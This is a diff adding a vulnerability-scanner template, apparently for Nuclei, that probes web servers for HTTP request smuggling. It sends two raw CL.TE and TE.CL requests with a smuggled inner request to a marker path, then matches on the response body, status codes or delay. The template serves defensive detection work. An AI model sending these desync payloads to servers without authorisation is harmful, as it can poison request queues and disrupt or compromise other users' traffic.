@@ -1,0 +1,60 @@
+id: whai-http-request-smuggling
+
+info:
+  name: HTTP Request Smuggling Detection
+  author: whitehat-ai
+  severity: high
+  description: Detects potential HTTP request smuggling via CL.TE and TE.CL techniques
+  tags: smuggling,desync,request-smuggling
+  reference:
+    - https://portswigger.net/web-security/request-smuggling
+    - https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn
+
+http:
+  - raw:
+      - |
+        POST {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /whai-smuggle-detect HTTP/1.1
+        Host: {{Hostname}}
+        X-Ignore: x
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(whai-smuggle-detect|404.*whai|not found.*whai)"
+
+      - type: status
+        status:
+          - 400
+          - 403
+
+  - raw:
+      - |
+        POST {{Path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 4
+        Transfer-Encoding: chunked
+
+        5e
+        POST /whai-smuggle-detect HTTP/1.1
+        Host: {{Hostname}}
+        Content-Length: 15
+
+        x=1
+        0
+
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration > 10"
